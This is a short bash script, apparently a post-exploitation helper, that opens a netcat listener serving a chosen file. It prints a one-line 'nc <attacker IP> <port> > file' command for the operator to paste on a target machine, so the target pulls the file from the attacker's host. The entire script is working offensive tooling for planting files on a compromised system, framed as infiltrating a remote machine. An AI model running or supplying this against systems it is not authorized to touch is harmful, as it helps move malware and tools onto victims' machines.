#! /bin/bash
# --------------- INFO ---------------
#
# upload.sh script: Infiltrate files from this machine to a remote one
#
# --------------- CODE ---------------

# Checks if no arguments are given
if [ $# != 2 ]; then
        echo "Usage: upload <file to upload> <port to use>"
        exit
fi

file="$1"
port=$2

# LHOST configuration
sudo ifconfig
echo -n "Your IP address (only supports IPv4): "
read address

# Command generation
command="nc $address $port > $1"
echo
echo "Paste on the target:"
echo "$command"
echo

# Server opening
echo "When the transfer is finished, press Ctrl + C to kill the server"
echo "[INFO] Server starting now"
nc -lvp $port < $1
